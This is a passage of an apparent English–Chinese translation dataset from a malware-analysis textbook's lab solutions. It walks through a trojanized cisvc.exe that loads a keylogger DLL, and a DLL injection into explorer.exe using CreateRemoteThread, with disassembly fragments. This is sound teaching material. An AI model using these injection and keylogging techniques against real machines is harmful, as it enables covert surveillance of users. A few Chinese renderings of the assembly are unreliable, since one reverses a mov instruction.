  zh: '*图11-7L：cisvc.exe原始版本和被木马化的版本的比较视图* 图11-7L的上半部分显示了加载到PEview中的原始*cisvc.exe*（命名为*cisvc_original.exe*），下半部分显示了被木马化的*cisvc.exe*。在和处，我们看到两个二进制文件的入口点不同。如果我们将这两个二进制文件都加载到IDA
    Pro中，我们会看到恶意软件已经执行了入口点重定向，以便在*cisvc.exe*启动时，shellcode总是在原始入口点之前运行。列表11-19L显示了*cisvc.exe*被木马化版本中的shellcode片段。'
- en: 01001B0A call dword ptr [ebp-4] 
  id: totrans-3463
  prefs: []
  type: TYPE_NORMAL
  zh: 01001B0A call dword ptr [ebp-4] 
- en: 01001B0D mov [ebp-10h], eax
  id: totrans-3464
  prefs: []
  type: TYPE_NORMAL
  zh: 01001B0D mov [ebp-10h], eax
- en: 01001B10 lea eax, [ebx+24h]
  id: totrans-3465
  prefs: []
  type: TYPE_NORMAL
  zh: 01001B10 lea eax, [ebx+24h]
- en: 01001B16 push eax
  id: totrans-3466
  prefs: []
  type: TYPE_NORMAL
  zh: 01001B16 push eax
- en: 01001B17 mov eax, [ebp-10h]
  id: totrans-3467
  prefs: []
  type: TYPE_NORMAL
  zh: 01001B17 mov eax, [ebp-10h]
- en: 01001B1A push eax
  id: totrans-3468
  prefs: []
  type: TYPE_NORMAL
  zh: 01001B1A push eax
- en: '**584**'
  id: totrans-3469
  prefs: []
  type: TYPE_NORMAL
  zh: '**584**'
- en: Appendix C
  id: totrans-3470
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-3471
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 01001B1B call dword ptr [ebp-0Ch] 
  id: totrans-3472
  prefs: []
  type: TYPE_NORMAL
  zh: 01001B1B call dword ptr [ebp-0Ch] 
- en: 01001B1E mov [ebp-8], eax
  id: totrans-3473
  prefs: []
  type: TYPE_NORMAL
  zh: 01001B1E mov [ebp-8], eax
- en: 01001B21 call dword ptr [ebp-8] 
  id: totrans-3474
  prefs: []
  type: TYPE_NORMAL
  zh: 01001B21 call dword ptr [ebp-8] 
- en: 01001B24 mov esp, ebp
  id: totrans-3475
  prefs: []
  type: TYPE_NORMAL
  zh: 01001B24 mov esp, ebp
- en: 01001B26 pop ebp
  id: totrans-3476
  prefs: []
  type: TYPE_NORMAL
  zh: 01001B26 pop ebp
- en: 01001B27 jmp _wmainCRTStartup 
  id: totrans-3477
  prefs: []
  type: TYPE_NORMAL
  zh: 01001B27 jmp _wmainCRTStartup 
- en: '*Listing 11-19L: Important calls within the shellcode inside the trojanized*
    cisvc.exe Now we load the trojanized version of *cisvc.exe* into a debugger and
    set a breakpoint at 0x1001B0A. We find that at , the malware calls LoadLibrary
    to load *inet_epar32.dll* into memory. At , the malware calls GetProcAddress
    with the argument zzz69806582 to get the address of the exported function.'
  id: totrans-3478
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表11-19L：被木马化的cisvc.exe内部shellcode中的重要调用* 现在我们将*cisvc.exe*的木马化版本加载到调试器中，并在0x1001B0A处设置一个断点。我们发现，在处，恶意软件调用LoadLibrary将*inet_epar32.dll*加载到内存中。在处，恶意软件使用参数zzz69806582调用GetProcAddress以获取导出函数的地址。'
- en: At , the malware calls zzz69806582\. Finally, the malware jumps to the original
    entry point at , so that the service can run as it would normally. The shellcode’s
    function matches our earlier suspicion that it loads *inet_epar32.dll* and calls
    its export.
  id: totrans-3479
  prefs: []
  type: TYPE_NORMAL
  zh: 在处，恶意软件调用zzz69806582。最后，恶意软件跳转到原始入口点，以便服务可以像正常一样运行。shellcode的功能符合我们之前的怀疑，即它加载*inet_epar32.dll*并调用其导出。
- en: '**Keylogger Analysis**'
  id: totrans-3480
  prefs: []
  type: TYPE_NORMAL
  zh: '**键盘记录器分析**'
- en: Next, we analyze *inet_epar32.dll*, which is the same as *Lab11-03.dll*. We
    load *Lab11-03.dll* into IDA Pro and begin to analyze the file. The majority of
    the **1 1**
  id: totrans-3481
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们分析*inet_epar32.dll*，它与*Lab11-03.dll*相同。我们将*Lab11-03.dll*加载到IDA Pro中，并开始分析文件。大多数的**1
    1**
- en: code stems from the zzz69806582 export. This export starts a thread and returns,
    so we will focus on analyzing the thread, as shown in Listing 11-20L.
  id: totrans-3482
  prefs: []
  type: TYPE_NORMAL
  zh: 代码来源于zzz69806582导出。这个导出启动了一个线程并返回，因此我们将重点关注分析这个线程，如列表11-20L所示。
- en: 1000149D push offset Name ; "MZ"
  id: totrans-3483
  prefs: []
  type: TYPE_NORMAL
  zh: 1000149D push offset Name ; "MZ"
- en: 100014A2 push 1 ; bInitialOwner 100014A4 push 0 ; lpMutexAttributes 100014A6
    call ds:CreateMutexA 
  id: totrans-3484
  prefs: []
  type: TYPE_NORMAL
  zh: 100014A2 push 1 ; bInitialOwner 100014A4 push 0 ; lpMutexAttributes 100014A6
    call ds:CreateMutexA 
- en: '...'
  id: totrans-3485
  prefs: []
  type: TYPE_NORMAL
  zh: '...'
- en: 100014BD push 0 ; hTemplateFile 100014BF push 80h ; dwFlagsAndAttributes 100014C4
    push 4 ; dwCreationDisposition 100014C6 push 0 ; lpSecurityAttributes 100014C8
    push 1 ; dwShareMode 100014CA push 0C0000000h ; dwDesiredAccess 100014CF push
    offset FileName ; "C:\\WINDOWS\\System32\\ kernel64x.dll"
  id: totrans-3486
  prefs: []
  type: TYPE_NORMAL
  zh: 100014BD push 0 ; hTemplateFile 100014BF push 80h ; dwFlagsAndAttributes 100014C4
    push 4 ; dwCreationDisposition 100014C6 push 0 ; lpSecurityAttributes 100014C8
    push 1 ; dwShareMode 100014CA push 0C0000000h ; dwDesiredAccess 100014CF push
    offset FileName ; "C:\\WINDOWS\\System32\\ kernel64x.dll"
- en: 100014D4 call ds:CreateFileA 
  id: totrans-3487
  prefs: []
  type: TYPE_NORMAL
  zh: 100014D4 call ds:CreateFileA 
- en: '*Listing 11-20L: Mutex and file creation performed by the thread created by
    zzz69806582*'
  id: totrans-3488
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表11-20L：由zzz69806582创建的线程执行的互斥锁和文件创建*'
- en: At , the malware creates a mutex named MZ. This mutex prevents the malware
    from running more than one instance of itself, since a previous call to OpenMutex
    (not shown) will terminate the thread if the mutex MZ already exists. Next, at
    , the malware opens or creates a file named *kernel64x.dll* for writing.
  id: totrans-3489
  prefs: []
  type: TYPE_NORMAL
  zh: 在处，恶意软件创建了一个名为MZ的互斥锁。这个互斥锁防止恶意软件运行多个实例，因为如果之前调用了OpenMutex（未显示），那么互斥锁MZ已经存在时，将终止线程。接下来，在处，恶意软件打开或创建一个名为*kernel64x.dll*的文件用于写入。
- en: After getting a handle to *kernel64x.dll*, the malware sets the file pointer
    to the end of the file and calls sub_10001380, which contains a loop. This loop
    contains calls to GetAsyncKeyState, GetForegroundWindow, and WriteFile. This is
    consistent with the keylogging method we discussed in “User-Space Keyloggers”
    on page 239\.
  id: totrans-3490
  prefs: []
  type: TYPE_NORMAL
  zh: 在获取到*kernel64x.dll*的句柄后，恶意软件将文件指针设置到文件末尾，并调用sub_10001380，其中包含一个循环。这个循环包含对GetAsyncKeyState、GetForegroundWindow和WriteFile的调用。这与我们在第239页上讨论的“用户空间键盘记录器”中的键盘记录方法一致。
- en: Solutions to Labs
  id: totrans-3491
  prefs: []
  type: TYPE_NORMAL
  zh: 实验解决方案
- en: '**585**'
  id: totrans-3492
  prefs: []
  type: TYPE_NORMAL
  zh: '**585**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-3493
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**Summary**'
  id: totrans-3494
  prefs: []
  type: TYPE_NORMAL
  zh: '**总结**'
- en: '*Lab11-03.exe* trojanizes and then starts the Windows indexing service ( *cisvc.exe*).'
  id: totrans-3495
  prefs: []
  type: TYPE_NORMAL
  zh: '*Lab11-03.exe* 木马化并启动Windows索引服务（*cisvc.exe*）。'
- en: The trojan shellcode loads a DLL and calls an exported function that launches
    a keylogger. The export creates the mutex MZ and logs all keystrokes to *kernel64x.dll*
    in the Windows system directory.
  id: totrans-3496
  prefs: []
  type: TYPE_NORMAL
  zh: 木马shellcode加载一个DLL并调用一个导出函数来启动键盘记录器。该导出创建互斥量MZ并将所有按键记录到Windows系统目录下的*kernel64x.dll*。
- en: '**Lab 12-1 Solutions**'
  id: totrans-3497
  prefs: []
  type: TYPE_NORMAL
  zh: '**Lab 12-1 解决方案**'
- en: '***Short Answers***'
  id: totrans-3498
  prefs: []
  type: TYPE_NORMAL
  zh: '***简答***'
- en: 1\.
  id: totrans-3499
  prefs: []
  type: TYPE_NORMAL
  zh: 1\.
- en: After you run the malware, pop-up messages are displayed on the screen every
    minute.
  id: totrans-3500
  prefs: []
  type: TYPE_NORMAL
  zh: 运行恶意软件后，屏幕上每分钟都会显示弹出消息。
- en: 2\.
  id: totrans-3501
  prefs: []
  type: TYPE_NORMAL
  zh: 2\.
- en: The process being injected is *explorer.exe*.
  id: totrans-3502
  prefs: []
  type: TYPE_NORMAL
  zh: 被注入的进程是*explorer.exe*。
- en: 3\.
  id: totrans-3503
  prefs: []
  type: TYPE_NORMAL
  zh: 3\.
- en: You can restart the *explorer.exe* process.
  id: totrans-3504
  prefs: []
  type: TYPE_NORMAL
  zh: 您可以重新启动*explorer.exe*进程。
- en: 4\.
  id: totrans-3505
  prefs: []
  type: TYPE_NORMAL
  zh: 4\.
- en: The malware performs DLL injection to launch *Lab12-01.dll* within *explorer.exe*.
    Once *Lab12-01.dll* is injected, it displays a message box on the screen every
    minute with a counter that shows how many minutes have elapsed.
  id: totrans-3506
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件执行DLL注入，在*explorer.exe*中启动*Lab12-01.dll*。一旦*Lab12-01.dll*被注入，它每分钟在屏幕上显示一个消息框，其中有一个计数器显示已经过去多少分钟。
- en: '***Detailed Analysis***'
  id: totrans-3507
  prefs: []
  type: TYPE_NORMAL
  zh: '***详细分析***'
- en: Let’s begin with basic static analysis. Examining the imports for *Lab12-01.exe*,
    we see CreateRemoteThread, WriteProcessMemory, and VirtualAllocEx. Based on the
    discussion in Chapter 12, we know that we are probably dealing with some form
    of process injection. Therefore, our first goal should be to determine the code
    that is being injected and into which process. Examining the strings in the malware,
    we see some notable ones, including explorer.exe, Lab12-01.dll, and psapi.dll.
  id: totrans-3508
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们从基本的静态分析开始。检查*Lab12-01.exe*的导入项，我们看到CreateRemoteThread、WriteProcessMemory和VirtualAllocEx。根据第12章的讨论，我们知道我们可能正在处理某种形式的进程注入。因此，我们的第一个目标应该是确定被注入的代码以及注入到哪个进程中。检查恶意软件中的字符串，我们看到一些值得注意的字符串，包括explorer.exe、Lab12-01.dll和psapi.dll。
- en: Next, we use basic dynamic techniques to see what the malware does when it runs.
    When we run the malware, it creates a message box every minute (quite annoying
    when you are trying to use analysis tools). Procmon doesn’t have any useful information,
    Process Explorer shows no obvious process running, and no network functions appear
    to be imported, so we shift to IDA Pro to determine what is producing the message
    boxes.
  id: totrans-3509
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们使用基本的动态技术来查看恶意软件运行时做了什么。当我们运行恶意软件时，它每分钟创建一个消息框（当你试图使用分析工具时非常烦人）。Procmon没有有用的信息，Process
    Explorer没有显示明显的进程运行，似乎没有导入任何网络功能，所以我们转向IDA Pro来确定产生消息框的是什么。
- en: A few lines from the start of the main function, we see the malware resolving
    functions for Windows process enumeration within *psapi.dll*. Listing 12-1L
  id: totrans-3510
  prefs: []
  type: TYPE_NORMAL
  zh: 在主函数开始处的一些代码中，我们看到恶意软件正在*psapi.dll*中解析Windows进程枚举的函数。列表12-1L
- en: contains one example of the three functions the malware manually resolves using
    LoadLibraryA and GetProcAddress.
  id: totrans-3511
  prefs: []
  type: TYPE_NORMAL
  zh: 包含恶意软件手动使用LoadLibraryA和GetProcAddress解析的三个函数的一个示例。
- en: 0040111F push offset ProcName ; "EnumProcessModules"
  id: totrans-3512
  prefs: []
  type: TYPE_NORMAL
  zh: 0040111F push offset ProcName ; "EnumProcessModules"
- en: 00401124 push offset LibFileName ; "psapi.dll"
  id: totrans-3513
  prefs: []
  type: TYPE_NORMAL
  zh: 00401124 push offset LibFileName ; "psapi.dll"
- en: 00401129 call ds:**LoadLibraryA**
  id: totrans-3514
  prefs: []
  type: TYPE_NORMAL
  zh: 00401129 call ds:**LoadLibraryA**
- en: 0040112F push eax ; hModule 00401130 call ds:**GetProcAddress**
  id: totrans-3515
  prefs: []
  type: TYPE_NORMAL
  zh: 0040112F push eax ; hModule 00401130 call ds:**GetProcAddress**
- en: 00401136 mov
  id: totrans-3516
  prefs: []
  type: TYPE_NORMAL
  zh: 00401136 mov
- en: dword_408714, eax
  id: totrans-3517
  prefs: []
  type: TYPE_NORMAL
  zh: dword_408714, eax
- en: '*Listing 12-1L: Dynamically resolving process enumeration imports* **586**'
  id: totrans-3518
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表12-1L：动态解析进程枚举导入* **586**'
- en: Appendix C
  id: totrans-3519
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-3520
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: The malware saves the function pointers to dword_408714, dword_40870C, and dword_408710\.
    We can change these global variables to more easily identify the function being
    called later in our analysis by renaming them myEnumProcessModules, myGetModuleBaseNameA,
    and myEnumProcesses. In Listing 12-1L, we should rename dword_408714 to myEnumProcessModules
    at .
  id: totrans-3521
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件将函数指针保存到dword_408714、dword_40870C和dword_408710。我们可以通过将它们重命名为myEnumProcessModules、myGetModuleBaseNameA和myEnumProcesses来更容易地识别分析中稍后调用的函数。在列表12-1L中，我们应该将dword_408714重命名为myEnumProcessModules，如所示。
- en: After the dynamic resolution of the functions, the code calls dword_408710
  id: totrans-3522
  prefs: []
  type: TYPE_NORMAL
  zh: 动态解析函数后，代码调用dword_408710
- en: (EnumProcesses), which retrieves a PID for each process object in the system.
  id: totrans-3523
  prefs: []
  type: TYPE_NORMAL
  zh: (EnumProcesses)，它检索系统中每个进程对象的PID。
- en: EnumProcesses returns an array of the PIDs referenced by the local variable
    dwProcessId. dwProcessId is used in a loop to iterate through the process list
    and call sub_401000 for each PID.
  id: totrans-3524
  prefs: []
  type: TYPE_NORMAL
  zh: EnumProcesses返回一个包含由局部变量dwProcessId引用的PID的数组。dwProcessId用于循环遍历进程列表，并对每个PID调用sub_401000。
- en: When we examine sub_401000, we see that the dynamically resolved import EnumProcessModules
    is called after OpenProcess for the PID passed to the function. Next, we see a
    call to dword_40870C (GetModuleBaseNameA) at , as shown in Listing 12-2L.
  id: totrans-3525
  prefs: []
  type: TYPE_NORMAL
  zh: 当我们检查sub_401000时，我们看到在传递给函数的PID之后，动态解析的导入函数EnumProcessModules在OpenProcess之后被调用。接下来，我们看到在处调用dword_40870C（GetModuleBaseNameA），如列表12-2L所示。
- en: 00401078 push 104h
  id: totrans-3526
  prefs: []
  type: TYPE_NORMAL
  zh: 00401078 将104h压入栈
- en: 0040107D lea ecx, [ebp+Str1]
  id: totrans-3527
  prefs: []
  type: TYPE_NORMAL
  zh: 0040107D 将[ebp+Str1]的地址加载到ecx寄存器
- en: 00401083 push ecx
  id: totrans-3528
  prefs: []
  type: TYPE_NORMAL
  zh: 00401083 压入ecx
- en: 00401084 mov edx, [ebp+var_10C]
  id: totrans-3529
  prefs: []
  type: TYPE_NORMAL
  zh: 00401084 将[ebp+var_10C]的值移动到edx寄存器
- en: 0040108A push edx
  id: totrans-3530
  prefs: []
  type: TYPE_NORMAL
  zh: 0040108A 压入edx
- en: 0040108B mov eax, [ebp+hObject]
  id: totrans-3531
  prefs: []
  type: TYPE_NORMAL
  zh: 0040108B 将eax寄存器的值移动到[ebp+hObject]
- en: 0040108E push eax
  id: totrans-3532
  prefs: []
  type: TYPE_NORMAL
  zh: 0040108E 压入eax
- en: 0040108F call dword_40870C  ; GetModuleBaseNameA 00401095 push 0Ch ; MaxCount
    **1 2**
  id: totrans-3533
  prefs: []
  type: TYPE_NORMAL
  zh: 0040108F 调用dword_40870C ；GetModuleBaseNameA 00401095 压入0Ch；MaxCount **1 2**
- en: 00401097 push offset Str2 ; "explorer.exe"
  id: totrans-3534
  prefs: []
  type: TYPE_NORMAL
  zh: 00401097 压入Str2的偏移量；“explorer.exe”
- en: 0040109C lea ecx, [ebp+Str1]
  id: totrans-3535
  prefs: []
  type: TYPE_NORMAL
  zh: 0040109C 将[ebp+Str1]的地址加载到ecx寄存器
- en: 004010A2 push ecx ; Str1
  id: totrans-3536
  prefs: []
  type: TYPE_NORMAL
  zh: 004010A2 压入ecx；Str1
- en: 004010A3 call _strnicmp 
  id: totrans-3537
  prefs: []
  type: TYPE_NORMAL
  zh: 004010A3 调用_strnicmp 
- en: '*Listing 12-2L: Strings compared against* explorer.exe'
  id: totrans-3538
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表12-2L：与explorer.exe比较的字符串*'
- en: The dynamically resolved function GetModuleBaseNameA is used to translate from
    the PID to the process name. After this call, we see a comparison at 
  id: totrans-3539
  prefs: []
  type: TYPE_NORMAL
  zh: 动态解析的函数GetModuleBaseNameA用于将PID转换为进程名称。在此调用之后，我们看到在处的比较
- en: between the strings obtained with GetModuleBaseNameA (Str1) and explorer.exe
    (Str2). The malware is looking for the *explorer.exe* process in memory.
  id: totrans-3540
  prefs: []
  type: TYPE_NORMAL
  zh: 在使用GetModuleBaseNameA获取的字符串（Str1）和explorer.exe（Str2）之间。恶意软件正在内存中寻找*explorer.exe*进程。
- en: Once *explorer.exe* is found, the function at sub_401000 will return 1, and
    the main function will call OpenProcess to open a handle to it. If the malware
    obtains a handle to the process successfully, the code in Listing 12-3L will execute,
    and the handle hProcess will be used to manipulate the process.
  id: totrans-3541
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦找到*explorer.exe*，sub_401000中的函数将返回1，主函数将调用OpenProcess来打开一个句柄。如果恶意软件成功获取进程句柄，列表12-3L中的代码将执行，并将句柄hProcess用于操作进程。
- en: 0040128C push 4 ; flProtect 0040128E push 3000h ; flAllocationType 00401293
    push 104h  ;
  id: totrans-3542
  prefs: []
  type: TYPE_NORMAL
  zh: 0040128C 压入4；flProtect 0040128E 压入3000h；flAllocationType 00401293 压入104h ；
- en: dwSize
  id: totrans-3543
  prefs: []
  type: TYPE_NORMAL
  zh: dwSize
- en: 00401298 push 0 ; lpAddress 0040129A mov edx, [ebp+**hProcess**]
  id: totrans-3544
  prefs: []
  type: TYPE_NORMAL
  zh: 00401298 压入0；lpAddress 0040129A 将[ebp+**hProcess**]的值移动到edx寄存器
- en: 004012A0 push edx ; hProcess 004012A1 call ds:**VirtualAllocEx** 
  id: totrans-3545
  prefs: []
  type: TYPE_NORMAL
  zh: 004012A0 压入edx；hProcess 004012A1 调用ds:**VirtualAllocEx** 
- en: 004012A7 mov [ebp+**lpParameter**], eax 
  id: totrans-3546
  prefs: []
  type: TYPE_NORMAL
  zh: 004012A7 将eax的值移动到[ebp+**lpParameter**] 
- en: 004012AD cmp [ebp+lpParameter], 0
  id: totrans-3547
  prefs: []
  type: TYPE_NORMAL
  zh: 004012AD 比较ebp+lpParameter的值是否为0
- en: 004012B4 jnz short loc_4012BE
  id: totrans-3548
  prefs: []
  type: TYPE_NORMAL
  zh: 004012B4 jnz short loc_4012BE
- en: '...'
  id: totrans-3549
  prefs: []
  type: TYPE_NORMAL
  zh: '...'
- en: Solutions to Labs
  id: totrans-3550
  prefs: []
  type: TYPE_NORMAL
  zh: 实验解决方案
- en: '**587**'
  id: totrans-3551
  prefs: []
  type: TYPE_NORMAL
  zh: '**587**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-3552
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 004012BE push 0 ; lpNumberOfBytesWritten 004012C0 push 104h ; nSize 004012C5
    lea eax, [ebp+**Buffer**]
  id: totrans-3553
  prefs: []
  type: TYPE_NORMAL
  zh: 004012BE 压入0；lpNumberOfBytesWritten 004012C0 压入104h；nSize 004012C5 将[ebp+**Buffer**]的地址加载到eax寄存器
- en: 004012CB push eax ; lpBuffer 004012CC mov ecx, [ebp+**lpParameter**]
  id: totrans-3554
  prefs: []
  type: TYPE_NORMAL
  zh: 004012CB 压入eax；lpBuffer 004012CC 将[ebp+**lpParameter**]的值移动到ecx寄存器
- en: 004012D2 push ecx ; lpBaseAddress 004012D3 mov edx, [ebp+**hProcess**]
  id: totrans-3555
  prefs: []
  type: TYPE_NORMAL
  zh: 004012D2 压入ecx；lpBaseAddress 004012D3 将[ebp+**hProcess**]的值移动到edx寄存器
- en: 004012D9 push edx ; hProcess 004012DA call ds:**WriteProcessMemory** 
  id: totrans-3556
  prefs: []
  type: TYPE_NORMAL
  zh: 004012D9 压入edx；hProcess 004012DA 调用ds:**WriteProcessMemory** 
- en: '*Listing 12-3L: Writing a string to a remote process*'
  id: totrans-3557
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表12-3L：向远程进程写入字符串*'
- en: 'In Listing 12-3L, we see a call to VirtualAllocEx at . This dynamically allocates
    memory in the *explorer.exe* process: 0x104 bytes are allocated by pushing dwSize
    at . If VirtualAllocEx is successful, a pointer to the allocated memory will
    be moved into lpParameter at , to be passed with the process handle to WriteProcessMemory
    at , in order to write data to *explorer.exe*. The data written to the process
    is referenced by the Buffer parameter in bold.'
  id: totrans-3558
  prefs: []
  type: TYPE_NORMAL
  zh: 在清单12-3L中，我们看到对VirtualAllocEx的调用。这将在*explorer.exe*进程中动态分配内存：通过在处推送dwSize，分配了0x104字节。如果VirtualAllocEx成功，分配的内存的指针将移动到lpParameter中，与进程句柄一起传递给WriteProcessMemory，以便向*explorer.exe*写入数据。写入进程的数据由粗体的Buffer参数引用。
- en: In order to understand what is injected, we trace the code back to where Buffer
    is set. We find it set to the path of the current directory appended with Lab12-01.dll.
    We can now conclude that this malware writes the path of *Lab12-01.dll* into the
    *explorer.exe* process.
  id: totrans-3559
  prefs: []
  type: TYPE_NORMAL
  zh: 为了理解被注入的内容，我们需要追踪代码到Buffer被设置的地方。我们发现它被设置为当前目录的路径附加Lab12-01.dll。现在我们可以得出结论，这种恶意软件将*Lab12-01.dll*的路径写入*explorer.exe*进程。
- en: If the malware successfully writes the path of the DLL into *explorer.exe*,
    the code in Listing 12-4L will execute.
  id: totrans-3560
  prefs: []
  type: TYPE_NORMAL
  zh: 如果恶意软件成功将DLL的路径写入*explorer.exe*，清单12-4L中的代码将执行。
- en: 004012E0 push offset ModuleName ; "kernel32.dll"
  id: totrans-3561
  prefs: []
  type: TYPE_NORMAL
  zh: 004012E0 push offset ModuleName ; "kernel32.dll"
- en: 004012E5 call ds:**GetModuleHandleA**
  id: totrans-3562
  prefs: []
  type: TYPE_NORMAL
  zh: 004012E5 call ds:**GetModuleHandleA**
- en: 004012EB mov [ebp+hModule], eax
  id: totrans-3563
  prefs: []
  type: TYPE_NORMAL
  zh: 004012EB mov [ebp+hModule], eax
- en: 004012F1 push offset aLoadlibrarya ; "LoadLibraryA"
  id: totrans-3564
  prefs: []
  type: TYPE_NORMAL
  zh: 004012F1 push offset aLoadlibrarya ; "LoadLibraryA"
- en: 004012F6 mov eax, [ebp+hModule]
  id: totrans-3565
  prefs: []
  type: TYPE_NORMAL
  zh: 004012F6 mov eax, [ebp+hModule]
- en: 004012FC push eax ; hModule 004012FD call ds:**GetProcAddress**
  id: totrans-3566
  prefs: []
  type: TYPE_NORMAL
  zh: 004012FC push eax ; hModule 004012FD call ds:**GetProcAddress**
- en: 00401303 mov [ebp+lpStartAddress], eax 
  id: totrans-3567
  prefs: []
  type: TYPE_NORMAL
  zh: 00401303 mov [ebp+lpStartAddress], eax 
- en: 00401309 push 0 ; lpThreadId 0040130B push 0 ; dwCreationFlags 0040130D mov
    ecx, [ebp+lpParameter]
  id: totrans-3568
  prefs: []
  type: TYPE_NORMAL
  zh: 00401309 push 0 ; lpThreadId 0040130B push 0 ; dwCreationFlags 0040130D mov
    ecx, [ebp+lpParameter]
- en: 00401313 push ecx ; lpParameter 00401314 mov edx, [ebp+lpStartAddress]
  id: totrans-3569
  prefs: []
  type: TYPE_NORMAL
  zh: 00401313 push ecx ; lpParameter 00401314 mov edx, [ebp+lpStartAddress]
- en: 0040131A push edx  ;
  id: totrans-3570
  prefs: []
  type: TYPE_NORMAL
  zh: 0040131A push edx  ;
- en: lpStartAddress
  id: totrans-3571
  prefs: []
  type: TYPE_NORMAL
  zh: lpStartAddress
- en: 0040131B push 0 ; dwStackSize 0040131D push 0 ; lpThreadAttributes 0040131F
    mov eax, [ebp+**hProcess**]
  id: totrans-3572
  prefs: []
  type: TYPE_NORMAL
  zh: 0040131B push 0 ; dwStackSize 0040131D push 0 ; lpThreadAttributes 0040131F
    mov eax, [ebp+**hProcess**]
- en: 00401325 push eax ; hProcess 00401326 call ds:CreateRemoteThread
  id: totrans-3573
  prefs: []
  type: TYPE_NORMAL
  zh: 00401325 push eax ; hProcess 00401326 call ds:CreateRemoteThread
- en: '*Listing 12-4L: Creating the remote thread*'
  id: totrans-3574
  prefs: []
  type: TYPE_NORMAL
  zh: '*清单12-4L：创建远程线程*'
- en: In Listing 12-4L, the calls to GetModuleHandleA and GetProcAddress (in bold)
    will be used to get the address to LoadLibraryA. The address of LoadLibraryA will
    be the same in *explorer.exe* as it is in the malware ( *Lab12-01.exe*) with the
    address of LoadLibraryA inserted into lpStartAddress shown at . lpStartAddress
    is provided to CreateRemoteThread at  in order to force *explorer.exe* to call
    LoadLibraryA.
  id: totrans-3575
  prefs: []
  type: TYPE_NORMAL
  zh: 在清单12-4L中，对GetModuleHandleA和GetProcAddress（粗体）的调用将用于获取LoadLibraryA的地址。LoadLibraryA的地址在*explorer.exe*中与在恶意软件（*Lab12-01.exe*）中相同，LoadLibraryA的地址显示在。lpStartAddress在处提供给CreateRemoteThread，以便强制*explorer.exe*调用LoadLibraryA。
- en: '**588**'
  id: totrans-3576
  prefs: []
  type: TYPE_NORMAL
  zh: '**588**'
- en: Appendix C
  id: totrans-3577
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-3578
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 131](index-622_1.png)'
  id: totrans-3579
  prefs: []
  type: TYPE_IMG
  zh: '![Image 131](index-622_1.png)'
- en: The parameter for LoadLibraryA is passed via CreateRemoteThread in lpParameter,
    the string containing the path to *Lab12-01.dll*. This, in turn, starts a thread
    in the remote process that calls LoadLibraryA with the parameter of Lab12-01.dll.
  id: totrans-3580
  prefs: []
  type: TYPE_NORMAL
  zh: LoadLibraryA的参数通过CreateRemoteThread传递给lpParameter，该字符串包含*Lab12-01.dll*的路径。这反过来在远程进程中启动一个线程，该线程使用Lab12-01.dll的参数调用LoadLibraryA。
- en: We can now conclude that this malware executable performs DLL injection of *Lab12-01.dll*
    into *explorer.exe*.
  id: totrans-3581
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们可以得出结论，这种恶意软件可执行文件将*Lab12-01.dll*注入到*explorer.exe*中。
- en: Now that we know where and what is being injected, we can try to stop those
    annoying pop-ups, launching Process Explorer to help us out. As shown in Figure
    12-1L, we select *explorer.exe* in the process listing, and then choose **View****Show
    Lower Pane** and **View****Lower Pane View****DLLs**.
  id: totrans-3582
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们知道了注入的位置和内容，我们可以尝试停止那些讨厌的弹出窗口，启动进程资源管理器来帮助我们。如图12-1L所示，我们在进程列表中选择*explorer.exe*，然后选择**视图****显示下窗格**和**视图****下窗格视图****DLLs**。
- en: Scrolling through the resulting window, we see *Lab12-01.dll* listed as being
    loaded into *explorer.exe*’s memory space. Using Process Explorer is an easy way
    to spot DLL injection and useful in confirming our IDA Pro analysis. To stop the
    pop-ups, we can use Process Explorer to kill *explorer.exe*, and then restart
    it by selecting **File****Run** and entering **explorer**.
  id: totrans-3583
  prefs: []
  type: TYPE_NORMAL
  zh: 滚动结果窗口，我们看到 *Lab12-01.dll* 被列为加载到 *explorer.exe* 的内存空间中。使用 Process Explorer
    是发现 DLL 注入的一种简单方法，并且有助于确认我们的 IDA Pro 分析。要停止弹出窗口，我们可以使用 Process Explorer 杀死 *explorer.exe*，然后通过选择
    **文件****运行** 并输入 **explorer** 来重新启动它。
- en: '**1 2**'
  id: totrans-3584
  prefs: []
  type: TYPE_NORMAL
  zh: '**1 2**'
- en: '*Figure 12-1L: Process Explorer view showing injected DLL*'
  id: totrans-3585
  prefs: []
  type: TYPE_NORMAL
  zh: '*图 12-1L：Process Explorer 视图显示注入的 DLL*'
- en: Having analyzed *Lab12-01.exe*, we move on to *Lab12-01.dll* to see if it does
    something in addition to creating message boxes. When we analyze *Lab12-01.dll*
    with IDA Pro, we see that it does little more than create a thread that then creates
    another thread. The code in Listing 12-5L is from the first thread, a loop that
    creates a thread every minute (0xEA60 milliseconds).
  id: totrans-3586
  prefs: []
  type: TYPE_NORMAL
  zh: 分析完 *Lab12-01.exe* 后，我们继续分析 *Lab12-01.dll*，看看它是否除了创建消息框之外还做了其他事情。当我们用 IDA Pro
